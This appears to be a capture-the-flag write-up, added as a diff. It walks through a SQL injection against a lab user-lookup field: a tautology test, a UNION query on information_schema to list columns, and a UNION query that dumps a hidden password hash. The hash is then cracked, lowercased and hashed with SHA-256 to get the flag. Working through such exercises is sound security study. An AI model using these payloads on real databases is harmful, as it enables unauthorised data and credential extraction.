@@ -1,0 +1,52 @@
+FIRST CHECK IF SQL INJECTION IS POSSIBLE
+1 OR 1 = 1;
+-> Return all users
+
+
+SECOND CHECK DB_STRUCTURE
+
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+-> Return all tables + columns
+
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : user_id
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : first_name
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : last_name
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : town
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : country
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : planet
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : Commentaire
+    ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
+    First name: users
+    Surname : countersign
+
+
+
+Check for each row in the users table if there is something interessting
+
+FINALLY FIND THIS with:
+1 UNION SELECT Commentaire, countersign FROM users
+GOT THIS:
+    ID: 1 UNION SELECT Commentaire, countersign FROM users 
+    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+    Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+
+decrypt md5 => 5ff9d0165b4f92b14994e5c685cdce28 =>  FortyTwo
+
+to lower case => fortytwo
+
+sha256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
